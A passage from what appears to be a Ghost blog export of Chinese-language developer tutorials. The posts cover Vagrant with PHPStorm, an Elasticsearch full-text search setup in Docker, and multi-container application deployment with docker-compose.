为什么用虚拟机\\n\\n当考虑需要在本地搭建一个独立的开发环境时，最传统的方式是，在自己的开发机上安装各种项目依赖的软件和库，以便项目能在本地环境中运行起来。而这种看起来最简单直接的方式却可能带来一些意想不到的麻烦：\\n\\n    1. 开发机可能和生产环境之间存在平台上的差异，比如多数开发者喜欢在Mac或者Windows上工作，而服务器多半是Linux。\\n    2. 同时在多个项目工作时，不同项目所依赖的软件版本可能存在冲突，而不同版本的软件在表现上的差异可能导致项目中的错误。\\n    3. 软件的安装方式、安装目录等可能存在差异。\\n    4. 对于对项目还不太熟悉的新成员，要正确安装项目所需要的各种软件及完成配置，往往要花上不少的时间。\\n\\n而所有这些可能存在的差异，最终可能表现为一个在传统的工作方式里十分常见的问题：`It (not) works on my machine!【代码在我的电脑上是(不)正常的】`。考虑到这一点，采用虚拟机来提供一个完全无差异的开发环境就成为了一个不错的方案。其实除了以上四点原因外，还有更重要的第五点：\\n\\n    作为一个有轻微洁癖的开发者，我绝不允许在我心爱的Mac上装一大堆乱七八糟的东西，哈哈。\\n\\n这样，理由就更加充分了。\\n\\n* 为什么用Vagrant\\n  \\n回答这个问题，首先我们要知道什么是`Vagrant`。\\n\\n简单的理解，Vagrant是一个虚拟机（如VirtualBox）的管理工具，通过Vagrant我们能以脚本化的方式创建一个我们需要的虚拟机，包括：设置虚拟机配置（内存，cpu），分配指定的IP地址，安装各种库和软件等。不过，这并不是一篇Vagrant基础教程，所以关于Vagrant的具体用法，还请Google。\\n\\n所以脚本化的使用方式就是我们选用Vagrant而不是直接使用Virtualbox的根本原因，我们可以通过配置文件定义在Virtualbox中的各种参数，以便可以容易的在团队间共享，而不是直接将镜像拷来拷去。\\n\\n在Vagrant中有一个重要的概念叫 `provisioner`, provisioner让我们可以使用一些第三方的运维工具（如：Chef，Puppet等）向虚拟机中安装软件，但是如果使用Chef中现成的开源部署脚本，往往会需要访问一些墙外的资源，这就显得有些尴尬。所以我一般都直接用shell provisioner，也就是自己写shell脚本的方式来完成部署。\\n\\n一段时间后，团队可以把比较稳定环境导出成一个box，之后就可以以这个box为基础，通过shell provisioner增量地更新环境。\\n\\n* 配合IDE使用\\n\\nVirtualbox仅仅为我们的代码提供了一个虚拟化的运行环境，而开发工具仍然是在我们本地的。下面我们以一个具体的例子（PHP + PHPStorm）来演示如果在JetBrains系列的IDE中与Vagrant结合使用。\\n\\n1. 指定Vagrant目录\\n\\n![](/content/images/2016/04/1.png)\\n\\n2. 指定PHP解释器\\n\\n![](/content/images/2016/04/2.png)\\n\\n这里有两种方式，一个是选择Vagrant并指定Vagrant的工作目录，IDE可以直接连接到虚拟机中。\\n![](/content/images/2016/04/3.png)\\n\\n另一种方式是通过 PHPStorm 提供的 deployment server 来实现，具体方式如下。\\n \\n![](/content/images/2016/04/5.png)\\n![](/content/images/2016/04/6.png)\\n![](/content/images/2016/04/4.png)\\n\\n执行测试，我们可以发现，PHPStorm 已经可以通过虚拟机中的PHP解释器来运行代码了。\\n\\n![](/content/images/2016/04/7.png)\\n\\n最后，我更推荐使用 deployment server 的方式来连接虚拟机。如果直接勾选 Vagrant 的连接方式，每次调用PHP解释器时，IDE 都会花比较长的时间来与虚拟机建立连接，而如果使用 deployment server SFTP 的方式，仅会在第一次连接虚拟机时花费较长的时间（上传客户端到虚拟机中），之后在使用上几乎与直接调用本地的PHP解释器没有什么差别。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>那么，在开始之前，我们先来思考几个问题 ...</p>\n</blockquote>\n<ul>\n<li>为什么用虚拟机</li>\n</ul>\n<p>当考虑需要在本地搭建一个独立的开发环境时，最传统的方式是，在自己的开发机上安装各种项目依赖的软件和库，以便项目能在本地环境中运行起来。而这种看起来最简单直接的方式却可能带来一些意想不到的麻烦：</p>\n<pre><code>1. 开发机可能和生产环境之间存在平台上的差异，比如多数开发者喜欢在Mac或者Windows上工作，而服务器多半是Linux。\n2. 同时在多个项目工作时，不同项目所依赖的软件版本可能存在冲突，而不同版本的软件在表现上的差异可能导致项目中的错误。\n3. 软件的安装方式、安装目录等可能存在差异。\n4. 对于对项目还不太熟悉的新成员，要正确安装项目所需要的各种软件及完成配置，往往要花上不少的时间。\n</code></pre>\n<p>而所有这些可能存在的差异，最终可能表现为一个在传统的工作方式里十分常见的问题：<code>It (not) works on my machine!【代码在我的电脑上是(不)正常的】</code>。考虑到这一点，采用虚拟机来提供一个完全无差异的开发环境就成为了一个不错的方案。其实除了以上四点原因外，还有更重要的第五点：</p>\n<pre><code>作为一个有轻微洁癖的开发者，我绝不允许在我心爱的Mac上装一大堆乱七八糟的东西，哈哈。\n</code></pre>\n<p>这样，理由就更加充分了。</p>\n<ul>\n<li>为什么用Vagrant</li>\n</ul>\n<p>回答这个问题，首先我们要知道什么是<code>Vagrant</code>。</p>\n<p>简单的理解，Vagrant是一个虚拟机（如VirtualBox）的管理工具，通过Vagrant我们能以脚本化的方式创建一个我们需要的虚拟机，包括：设置虚拟机配置（内存，cpu），分配指定的IP地址，安装各种库和软件等。不过，这并不是一篇Vagrant基础教程，所以关于Vagrant的具体用法，还请Google。</p>\n<p>所以脚本化的使用方式就是我们选用Vagrant而不是直接使用Virtualbox的根本原因，我们可以通过配置文件定义在Virtualbox中的各种参数，以便可以容易的在团队间共享，而不是直接将镜像拷来拷去。</p>\n<p>在Vagrant中有一个重要的概念叫 <code>provisioner</code>, provisioner让我们可以使用一些第三方的运维工具（如：Chef，Puppet等）向虚拟机中安装软件，但是如果使用Chef中现成的开源部署脚本，往往会需要访问一些墙外的资源，这就显得有些尴尬。所以我一般都直接用shell provisioner，也就是自己写shell脚本的方式来完成部署。</p>\n<p>一段时间后，团队可以把比较稳定环境导出成一个box，之后就可以以这个box为基础，通过shell provisioner增量地更新环境。</p>\n<ul>\n<li>配合IDE使用</li>\n</ul>\n<p>Virtualbox仅仅为我们的代码提供了一个虚拟化的运行环境，而开发工具仍然是在我们本地的。下面我们以一个具体的例子（PHP + PHPStorm）来演示如果在JetBrains系列的IDE中与Vagrant结合使用。</p>\n<ol>\n<li>指定Vagrant目录</li>\n</ol>\n<p><img src=\"/content/images/2016/04/1.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>指定PHP解释器</li>\n</ol>\n<p><img src=\"/content/images/2016/04/2.png\" alt=\"\"></p>\n<p>这里有两种方式，一个是选择Vagrant并指定Vagrant的工作目录，IDE可以直接连接到虚拟机中。<br>\n<img src=\"/content/images/2016/04/3.png\" alt=\"\"></p>\n<p>另一种方式是通过 PHPStorm 提供的 deployment server 来实现，具体方式如下。</p>\n<p><img src=\"/content/images/2016/04/5.png\" alt=\"\"><br>\n<img src=\"/content/images/2016/04/6.png\" alt=\"\"><br>\n<img src=\"/content/images/2016/04/4.png\" alt=\"\"></p>\n<p>执行测试，我们可以发现，PHPStorm 已经可以通过虚拟机中的PHP解释器来运行代码了。</p>\n<p><img src=\"/content/images/2016/04/7.png\" alt=\"\"></p>\n<p>最后，我更推荐使用 deployment server 的方式来连接虚拟机。如果直接勾选 Vagrant 的连接方式，每次调用PHP解释器时，IDE 都会花比较长的时间来与虚拟机建立连接，而如果使用 deployment server SFTP 的方式，仅会在第一次连接虚拟机时花费较长的时间（上传客户端到虚拟机中），之后在使用上几乎与直接调用本地的PHP解释器没有什么差别。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"49","plaintext":"> 那么，在开始之前，我们先来思考几个问题 ...\n\n\n * 为什么用虚拟机\n\n当考虑需要在本地搭建一个独立的开发环境时，最传统的方式是，在自己的开发机上安装各种项目依赖的软件和库，以便项目能在本地环境中运行起来。而这种看起来最简单直接的方式却可能带来一些意想不到的麻烦：\n\n1. 开发机可能和生产环境之间存在平台上的差异，比如多数开发者喜欢在Mac或者Windows上工作，而服务器多半是Linux。\n2. 同时在多个项目工作时，不同项目所依赖的软件版本可能存在冲突，而不同版本的软件在表现上的差异可能导致项目中的错误。\n3. 软件的安装方式、安装目录等可能存在差异。\n4. 对于对项目还不太熟悉的新成员，要正确安装项目所需要的各种软件及完成配置，往往要花上不少的时间。\n\n\n而所有这些可能存在的差异，最终可能表现为一个在传统的工作方式里十分常见的问题：It (not) works on my\nmachine!【代码在我的电脑上是(不)正常的】\n。考虑到这一点，采用虚拟机来提供一个完全无差异的开发环境就成为了一个不错的方案。其实除了以上四点原因外，还有更重要的第五点：\n\n作为一个有轻微洁癖的开发者，我绝不允许在我心爱的Mac上装一大堆乱七八糟的东西，哈哈。\n\n\n这样，理由就更加充分了。\n\n * 为什么用Vagrant\n\n回答这个问题，首先我们要知道什么是Vagrant。\n\n简单的理解，Vagrant是一个虚拟机（如VirtualBox）的管理工具，通过Vagrant我们能以脚本化的方式创建一个我们需要的虚拟机，包括：设置虚拟机配置（内存，cpu），分配指定的IP地址，安装各种库和软件等。不过，这并不是一篇Vagrant基础教程，所以关于Vagrant的具体用法，还请Google。\n\n所以脚本化的使用方式就是我们选用Vagrant而不是直接使用Virtualbox的根本原因，我们可以通过配置文件定义在Virtualbox中的各种参数，以便可以容易的在团队间共享，而不是直接将镜像拷来拷去。\n\n在Vagrant中有一个重要的概念叫 provisioner,\nprovisioner让我们可以使用一些第三方的运维工具（如：Chef，Puppet等）向虚拟机中安装软件，但是如果使用Chef中现成的开源部署脚本，往往会需要访问一些墙外的资源，这就显得有些尴尬。所以我一般都直接用shell\nprovisioner，也就是自己写shell脚本的方式来完成部署。\n\n一段时间后，团队可以把比较稳定环境导出成一个box，之后就可以以这个box为基础，通过shell provisioner增量地更新环境。\n\n * 配合IDE使用\n\nVirtualbox仅仅为我们的代码提供了一个虚拟化的运行环境，而开发工具仍然是在我们本地的。下面我们以一个具体的例子（PHP +\nPHPStorm）来演示如果在JetBrains系列的IDE中与Vagrant结合使用。\n\n 1. 指定Vagrant目录\n\n\n\n 2. 指定PHP解释器\n\n\n\n这里有两种方式，一个是选择Vagrant并指定Vagrant的工作目录，IDE可以直接连接到虚拟机中。\n\n\n另一种方式是通过 PHPStorm 提供的 deployment server 来实现，具体方式如下。\n\n\n\n\n\n执行测试，我们可以发现，PHPStorm 已经可以通过虚拟机中的PHP解释器来运行代码了。\n\n\n\n最后，我更推荐使用 deployment server 的方式来连接虚拟机。如果直接勾选 Vagrant 的连接方式，每次调用PHP解释器时，IDE\n都会花比较长的时间来与虚拟机建立连接，而如果使用 deployment server SFTP\n的方式，仅会在第一次连接虚拟机时花费较长的时间（上传客户端到虚拟机中），之后在使用上几乎与直接调用本地的PHP解释器没有什么差别。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-09-27 15:10:36","updated_at":"2017-01-10 02:54:26","published_at":"2016-04-23 07:41:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e75","uuid":"ca4bf5ce-5735-430c-b0fb-3a6b063f5df2","title":"用Elasticsearch搭建一个全文搜索服务","slug":"build-a-search-engine-with-elasticsearch","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。\\n(百度百科)\\n\\n#####准备工作\\n\\n在Docker容器中运行 `Elasticsearch` 并安装 `elasticsearch-head` 管理工具, 注意将 `Elasticsearch` 的 `9200` `9300` 端口映射到宿主机, 并将 `config` 及 `plugins` 目录挂载到宿主机.\\n\\n`docker-compose.yml` 配置:\\n\\n```json\\nversion: '2'\\nservices:\\n\\n  elasticsearch:\\n    image: elasticsearch:5.2.0\\n    container_name: med-news-es-dev\\n    ports:\\n      - \\\"9200:9200\\\"\\n      - \\\"9300:9300\\\"\\n    volumes: \\n     - $PWD/elasticsearch/config:/usr/share/elasticsearch/config\\n     - $PWD/elasticsearch/plugins:/usr/share/elasticsearch/plugins\\n    restart: always\\n\\n  elasticsearch-head:\\n    image: mobz/elasticsearch-head:5\\n    container_name: med-news-es-head-dev\\n    ports:\\n      - \\\"9100:9100\\\"\\n    restart: always\\n```\\n\\n#####配置及插件\\n\\n编辑 `config/elasticsearch.yml`:\\n\\n```\\nhttp.host: 0.0.0.0\\nhttp.cors.enabled: true\\nhttp.cors.allow-origin: \\\"*\\\"\\n\\ncluster.name: \\\"cluster_name\\\"\\nnode.name: \\\"node_name\\\"\\n``` \\n\\n`IK` 分词插件, 将插件下载解压并放入plugins目录, 详见[项目主页](https://github.com/medcl/elasticsearch-analysis-ik)\\n\\n#####创建索引\\n\\ncurl -XPOST localhost:9200/news -d '\\n```json\\n\\\"mappings\\\": {\\n  \\\"news\\\": {\\n    \\\"properties\\\":{\\n      \\\"title\\\" : {\\n        \\\"type\\\": \\\"string\\\",\\n        \\\"fields\\\": {\\n          \\\"raw\\\": {\\n            \\\"type\\\": \\\"string\\\",\\n            \\\"index\\\": \\\"not_analyzed\\\"\\n          },\\n          \\\"ik\\\": {\\n            \\\"type\\\":\\\"string\\\",\\n            \\\"analyzer\\\":\\\"ik_max_word\\\"\\n          }\\n        }\\n      },\\n      \\\"content\\\": {\\n        \\\"type\\\": \\\"text\\\",\\n        \\\"analyzer\\\":\\\"ik_smart\\\"\\n      },\\n      \\\"keywords\\\": {\\n        \\\"type\\\": \\\"keyword\\\"\\n      },\\n      \\\"publishedAt\\\": {\\n        \\\"type\\\": \\\"date\\\"\\n      },\\n    }\\n  }\\n}\\n```\\n'\\n\\n* 在 `Elasticsearch` 5.0中, `string` 被拆分为 `text` 和 `keyword` 两种类型, `text` 会被分词,整个字符串根据一定规则分解成一个个term, `keyword` 则不会被分词.\\n\\n#####查询语句\\n\\ncurl -XGET localhost:9200/news/news/_search -d '\\n```json\\n{\\n    \\\"query\\\":{\\n      \\\"bool\\\":{\\n        \\\"should\\\":[\\n          {\\n            \\\"multi_match\\\": {\\n              \\\"query\\\":\\\"关键词1\\\",\\n              \\\"type\\\":\\\"most_fields\\\",\\n              \\\"fields\\\":[\\\"title.ik^10\\\",\\\"keywords^10\\\",\\\"content\\\"],\\n              \\\"boost\\\":5\\n            }\\n          },\\n          {\\n            \\\"multi_match\\\": {\\n              \\\"query\\\":\\\"关键词2\\\",\\n              \\\"type\\\":\\\"most_fields\\\",\\n              \\\"fields\\\":[\\\"title.ik^10\\\",\\\"keywords^10\\\",\\\"content\\\"],\\n              \\\"boost\\\":10\\n            }\\n          },\\n        ],\\n        \\\"filter\\\":{\\n          \\\"bool\\\":{\\n            \\\"must\\\":[\\n              {\\n                \\\"term\\\":{\\n                  \\\"status\\\":2\\n                }\\n              }\\n            ],\\n          }\\n        }\\n      }\\n    },\\n    \\\"sort\\\":{\\n      \\\"_score\\\":{\\n        \\\"order\\\":\\\"desc\\\"\\n      },\\n      \\\"publishedAt\\\":{\\n        \\\"order\\\":\\\"desc\\\"\\n      }\\n    },\\n    \\\"from\\\":0,\\n    \\\"size\\\":10\\n}\\n```\\n\\n* 详见`Elasticsearch` [Bool 查询](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-bool-query.html) 及 [Multi Match 查询](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-multi-match-query.html)\\n\\n通过 `Elasticsearch` 查询语句可以构造出 `搜索` `过滤` `排序` `分页` 等查询条件.\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。<br>\n(百度百科)</p>\n</blockquote>\n<h5 id=\"\">准备工作</h5>\n<p>在Docker容器中运行 <code>Elasticsearch</code> 并安装 <code>elasticsearch-head</code> 管理工具, 注意将 <code>Elasticsearch</code> 的 <code>9200</code> <code>9300</code> 端口映射到宿主机, 并将 <code>config</code> 及 <code>plugins</code> 目录挂载到宿主机.</p>\n<p><code>docker-compose.yml</code> 配置:</p>\n<pre><code class=\"language-json\">version: '2'\nservices:\n\n  elasticsearch:\n    image: elasticsearch:5.2.0\n    container_name: med-news-es-dev\n    ports:\n      - &quot;9200:9200&quot;\n      - &quot;9300:9300&quot;\n    volumes: \n     - $PWD/elasticsearch/config:/usr/share/elasticsearch/config\n     - $PWD/elasticsearch/plugins:/usr/share/elasticsearch/plugins\n    restart: always\n\n  elasticsearch-head:\n    image: mobz/elasticsearch-head:5\n    container_name: med-news-es-head-dev\n    ports:\n      - &quot;9100:9100&quot;\n    restart: always\n</code></pre>\n<h5 id=\"\">配置及插件</h5>\n<p>编辑 <code>config/elasticsearch.yml</code>:</p>\n<pre><code>http.host: 0.0.0.0\nhttp.cors.enabled: true\nhttp.cors.allow-origin: &quot;*&quot;\n\ncluster.name: &quot;cluster_name&quot;\nnode.name: &quot;node_name&quot;\n</code></pre>\n<p><code>IK</code> 分词插件, 将插件下载解压并放入plugins目录, 详见<a href=\"https://github.com/medcl/elasticsearch-analysis-ik\">项目主页</a></p>\n<h5 id=\"\">创建索引</h5>\n<p>curl -XPOST localhost:9200/news -d '</p>\n<pre><code class=\"language-json\">&quot;mappings&quot;: {\n  &quot;news&quot;: {\n    &quot;properties&quot;:{\n      &quot;title&quot; : {\n        &quot;type&quot;: &quot;string&quot;,\n        &quot;fields&quot;: {\n          &quot;raw&quot;: {\n            &quot;type&quot;: &quot;string&quot;,\n            &quot;index&quot;: &quot;not_analyzed&quot;\n          },\n          &quot;ik&quot;: {\n            &quot;type&quot;:&quot;string&quot;,\n            &quot;analyzer&quot;:&quot;ik_max_word&quot;\n          }\n        }\n      },\n      &quot;content&quot;: {\n        &quot;type&quot;: &quot;text&quot;,\n        &quot;analyzer&quot;:&quot;ik_smart&quot;\n      },\n      &quot;keywords&quot;: {\n        &quot;type&quot;: &quot;keyword&quot;\n      },\n      &quot;publishedAt&quot;: {\n        &quot;type&quot;: &quot;date&quot;\n      },\n    }\n  }\n}\n</code></pre>\n<p>'</p>\n<ul>\n<li>在 <code>Elasticsearch</code> 5.0中, <code>string</code> 被拆分为 <code>text</code> 和 <code>keyword</code> 两种类型, <code>text</code> 会被分词,整个字符串根据一定规则分解成一个个term, <code>keyword</code> 则不会被分词.</li>\n</ul>\n<h5 id=\"\">查询语句</h5>\n<p>curl -XGET localhost:9200/news/news/_search -d '</p>\n<pre><code class=\"language-json\">{\n    &quot;query&quot;:{\n      &quot;bool&quot;:{\n        &quot;should&quot;:[\n          {\n            &quot;multi_match&quot;: {\n              &quot;query&quot;:&quot;关键词1&quot;,\n              &quot;type&quot;:&quot;most_fields&quot;,\n              &quot;fields&quot;:[&quot;title.ik^10&quot;,&quot;keywords^10&quot;,&quot;content&quot;],\n              &quot;boost&quot;:5\n            }\n          },\n          {\n            &quot;multi_match&quot;: {\n              &quot;query&quot;:&quot;关键词2&quot;,\n              &quot;type&quot;:&quot;most_fields&quot;,\n              &quot;fields&quot;:[&quot;title.ik^10&quot;,&quot;keywords^10&quot;,&quot;content&quot;],\n              &quot;boost&quot;:10\n            }\n          },\n        ],\n        &quot;filter&quot;:{\n          &quot;bool&quot;:{\n            &quot;must&quot;:[\n              {\n                &quot;term&quot;:{\n                  &quot;status&quot;:2\n                }\n              }\n            ],\n          }\n        }\n      }\n    },\n    &quot;sort&quot;:{\n      &quot;_score&quot;:{\n        &quot;order&quot;:&quot;desc&quot;\n      },\n      &quot;publishedAt&quot;:{\n        &quot;order&quot;:&quot;desc&quot;\n      }\n    },\n    &quot;from&quot;:0,\n    &quot;size&quot;:10\n}\n</code></pre>\n<ul>\n<li>详见<code>Elasticsearch</code> <a href=\"https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-bool-query.html\">Bool 查询</a> 及 <a href=\"https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-multi-match-query.html\">Multi Match 查询</a></li>\n</ul>\n<p>通过 <code>Elasticsearch</code> 查询语句可以构造出 <code>搜索</code> <code>过滤</code> <code>排序</code> <code>分页</code> 等查询条件.</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"54","plaintext":"> ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful\nweb接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。\n(百度百科)\n\n\n准备工作\n在Docker容器中运行 Elasticsearch  并安装 elasticsearch-head  管理工具, 注意将 Elasticsearch  的 \n9200  9300  端口映射到宿主机, 并将 config  及 plugins  目录挂载到宿主机.\n\ndocker-compose.yml  配置:\n\nversion: '2'\nservices:\n\n  elasticsearch:\n    image: elasticsearch:5.2.0\n    container_name: med-news-es-dev\n    ports:\n      - \"9200:9200\"\n      - \"9300:9300\"\n    volumes: \n     - $PWD/elasticsearch/config:/usr/share/elasticsearch/config\n     - $PWD/elasticsearch/plugins:/usr/share/elasticsearch/plugins\n    restart: always\n\n  elasticsearch-head:\n    image: mobz/elasticsearch-head:5\n    container_name: med-news-es-head-dev\n    ports:\n      - \"9100:9100\"\n    restart: always\n\n\n配置及插件\n编辑 config/elasticsearch.yml:\n\nhttp.host: 0.0.0.0\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"*\"\n\ncluster.name: \"cluster_name\"\nnode.name: \"node_name\"\n\n\nIK  分词插件, 将插件下载解压并放入plugins目录, 详见项目主页\n[https://github.com/medcl/elasticsearch-analysis-ik]\n\n创建索引\ncurl -XPOST localhost:9200/news -d '\n\n\"mappings\": {\n  \"news\": {\n    \"properties\":{\n      \"title\" : {\n        \"type\": \"string\",\n        \"fields\": {\n          \"raw\": {\n            \"type\": \"string\",\n            \"index\": \"not_analyzed\"\n          },\n          \"ik\": {\n            \"type\":\"string\",\n            \"analyzer\":\"ik_max_word\"\n          }\n        }\n      },\n      \"content\": {\n        \"type\": \"text\",\n        \"analyzer\":\"ik_smart\"\n      },\n      \"keywords\": {\n        \"type\": \"keyword\"\n      },\n      \"publishedAt\": {\n        \"type\": \"date\"\n      },\n    }\n  }\n}\n\n\n'\n\n * 在 Elasticsearch  5.0中, string  被拆分为 text  和 keyword  两种类型, text \n   会被分词,整个字符串根据一定规则分解成一个个term, keyword  则不会被分词.\n\n查询语句\ncurl -XGET localhost:9200/news/news/_search -d '\n\n{\n    \"query\":{\n      \"bool\":{\n        \"should\":[\n          {\n            \"multi_match\": {\n              \"query\":\"关键词1\",\n              \"type\":\"most_fields\",\n              \"fields\":[\"title.ik^10\",\"keywords^10\",\"content\"],\n              \"boost\":5\n            }\n          },\n          {\n            \"multi_match\": {\n              \"query\":\"关键词2\",\n              \"type\":\"most_fields\",\n              \"fields\":[\"title.ik^10\",\"keywords^10\",\"content\"],\n              \"boost\":10\n            }\n          },\n        ],\n        \"filter\":{\n          \"bool\":{\n            \"must\":[\n              {\n                \"term\":{\n                  \"status\":2\n                }\n              }\n            ],\n          }\n        }\n      }\n    },\n    \"sort\":{\n      \"_score\":{\n        \"order\":\"desc\"\n      },\n      \"publishedAt\":{\n        \"order\":\"desc\"\n      }\n    },\n    \"from\":0,\n    \"size\":10\n}\n\n\n * 详见Elasticsearch  Bool 查询\n   [https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-bool-query.html] \n    及 Multi Match 查询\n   [https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-multi-match-query.html]\n\n通过 Elasticsearch  查询语句可以构造出 搜索  过滤  排序  分页  等查询条件.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-04-18 08:51:02","updated_at":"2017-03-27 15:26:45","published_at":"2017-03-27 15:23:19","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e76","uuid":"fe20428f-96bf-49cc-a207-e7b40579941d","title":"软件服务化——把应用交给Docker吧","slug":"caas-run-application-with-docker","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 在传统的应用部署实践中，我们需要在应用发布之前在服务器上准备好其所需的环境（如项目所依赖的库、语法解释器、Web容器等），Docker则为我们提供了一种更优雅的方式来解决这一问题。\\n\\n\\n![](/content/images/2016/05/Screen-Shot-2016-05-02-at-1-37-41-PM-1.png)\\n\\n* 什么是Docker\\n\\n    Docker可以帮助你把项目应用及相关所有依赖打包成一个标准化的单元。Docker容器是由Docker提供的虚拟化环境，在一个Docker容器中包含了运行项目所需的一切：代码、系统库、其他软件，总之，包括了你可以在服务器上安装的一切。\\n\\n* 为什么用Docker\\n\\n    Docker的意义就在于将运行项目所需的外部依赖统统作为项目的组成部分包含在项目下的一个Docker配置文件中，通过它我们可以直接让项目在Docker中运行起来，这样的做的好处是显而易见的：\\n\\n```\\n1. 不再需要提前在服务器上安装及配置项目所依赖的环境\\n2. 降低项目在开发过程中，开发环境不断迭代更新的成本以及搭建项目环境的成本\\n3. 多个应用在同一台服务器运行时，可以方便的隔离环境，避免依赖冲突\\n4. 所有项目都运行在Docker的虚拟容器中，物理机干干净净！爽！！\\n```\\n\\n* 实践\\n\\n  Docker容器为应用提供了独立的运行环境，Docker提供了一组命令行工具，让我们可以方便的对Docker容器进行管理。对于非Linux的平台，我们还需要先安装`docker-machine`（这相对于一个linux虚拟机），再将docker容器放在`docker-machine`中。\\n\\n  `docker-compose`是Docker提供的另一个非常有用的管理工具，我们可以通过定义`docker-compose`的配置文件，对多个Docker容器统一进行管理。下是一个`docker-compose.yml`文件的例子：\\n\\n```\\nversion: '2'\\n\\nservices:\\n  mysql:\\n    image: mysql:5.7\\n    container_name: mysql\\n    ports:\\n      - \\\"3309:3306\\\"\\n    volumes:\\n      - ./mysql/data:/var/lib/mysql\\n      - ./mysql/etc/conf.d:/etc/mysql/conf.d\\n      - ./mysql_run.sh:/mysql_run.sh\\n    command: /mysql_run.sh\\n    env_file: .env\\n    restart: always\\n\\n  nginx:\\n    image: nginx:1.9.8\\n    container_name: nginx\\n    ports:\\n      - \\\"80:80\\\"\\n    volumes:\\n      - ./nginx/etc/conf.d:/etc/nginx/conf.d\\n      - ./www:/usr/share/nginx/html\\n    links:\\n      - web\\n      - phpmyadmin\\n    restart: always\\n\\n  web:\\n    #image: php:5.6-fpm\\n    build: ./web\\n    container_name: web\\n    links:\\n      - \\\"mysql\\\"\\n      - \\\"beanstalkd\\\"\\n    ports:\\n      - \\\"9009:9001\\\"\\n    volumes: \\n      - ./web/cron:/etc/pam.d/cron\\n      - ./web/crontab:/etc/crontab\\n      - ./web/log:/var/log\\n      - ./web/supervisor:/etc/supervisor/conf.d\\n      - ./www:/usr/share/nginx/html\\n    restart: always\\n\\n  phpmyadmin:\\n    image: phpmyadmin/phpmyadmin\\n    container_name: phpmyadmin\\n    env_file: .env\\n    links:\\n      - mysql:db\\n    ports:\\n      - \\\"8888:80\\\"\\n    restart: always\\n\\n  beanstalkd:\\n    image: schickling/beanstalkd\\n    container_name: beanstalkd\\n    ports:\\n      - \\\"11300:11300\\\"\\n    restart: always\\n\\n```\\n\\n\\n需要注意的是，根据Docker的设计理念，一个容器中只应包含一个进程，整个项目再由多个Docker容器组合而成。但是，如果确实需要在一个Docker容器中\\n运行多个程序的话，可以用类似supervisor的方式来实现，[这里可以参考官方给出的例子](https://docs.docker.com/engine/admin/using_supervisord/)。上面说的这种情况，比较常见的是需要通过crontab定时执行项目中的某个任务，[在这里也提供了一个具体的例子可供参考](https://github.com/chxj1992/docker/tree/master/web)。\\n\\n解耦是软件工程中重要的思想之一，Docker所做的工作正是解除了项目与平台间的耦合，将项目生命的整个生态系统封装在一个个独立的集装箱里，服务器本身则如同运载货物的甲板，无须再提供额外的服务。随着项目规模的增长及分布式方案的应用，相较于传统的部署方式，Docker的优势会变得更加明显。所以，如果有兴趣，不妨试着把自己的项目封装成一个Docker容器，也来体验一把一键部署的快感！\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>在传统的应用部署实践中，我们需要在应用发布之前在服务器上准备好其所需的环境（如项目所依赖的库、语法解释器、Web容器等），Docker则为我们提供了一种更优雅的方式来解决这一问题。</p>\n</blockquote>\n<p><img src=\"/content/images/2016/05/Screen-Shot-2016-05-02-at-1-37-41-PM-1.png\" 